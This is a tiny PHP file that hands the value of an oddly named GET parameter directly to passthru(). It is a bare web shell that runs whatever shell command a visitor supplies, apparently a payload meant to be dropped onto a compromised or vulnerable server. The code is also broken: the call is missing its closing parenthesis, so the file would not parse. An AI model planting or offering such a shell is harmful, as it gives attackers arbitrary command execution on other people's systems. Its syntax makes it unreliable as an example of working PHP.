<?php
passthru($_GET['PgReZIpT'];
?>
